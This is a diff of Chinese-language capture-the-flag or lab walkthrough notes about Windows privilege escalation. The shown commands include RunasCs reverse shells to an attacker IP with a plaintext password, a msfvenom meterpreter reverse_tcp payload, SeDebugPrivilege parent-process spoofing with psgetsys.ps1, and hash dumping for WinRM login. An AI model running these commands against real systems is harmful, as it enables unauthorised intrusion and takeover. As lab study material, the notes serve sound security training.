@@ -900,7 +900,7 @@ $cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List
 使用[runascs](https://github.com/antonioCoco/RunasCs)可以绕过uac
 runas的进阶,可以通过显示凭据登录
 
-`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.26:3333`
+`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.56:4444`
 
 5f4904d57c58149a29d31ca4d073387c
 
@@ -933,14 +933,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.56 lport=5959 -f 
 
 ---
 `whoami /priv`
-开了d
-ebug
+开了debug
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240424011203.png)
 
-`import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(552,"C:\windows\system32\cmd.exe")`
+`import-module .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(552,"C:\windows\system32\cmd.exe")`
 `[MyProcess]::CreateProcessFromParent(656,"c:\windows\system32\cmd.exe","")`
 
 `.\pov.exe 552 ".\RunasCs.exe cmd.exe -r 10.10.16.56:4444"`
+
 
 
 ```powershell
@@ -952,6 +952,10 @@ https://blog.csdn.net/m0_52742680/article/details/135905285?utm_medium=distribut
 
 也可在拿到meterpreter后使用hashdump抓取管理员密码hash然后内网穿透,使用winrm登录
 
+
+```
+. .\psgetsys.ps1|ImpersonateFromParentPid -ppid 556 -command "cmd.exe" -cmdargs "/c powershell.exe curl http://10.10.16.56:8000"
+```
 ### Manager
 #### user
 - nmap
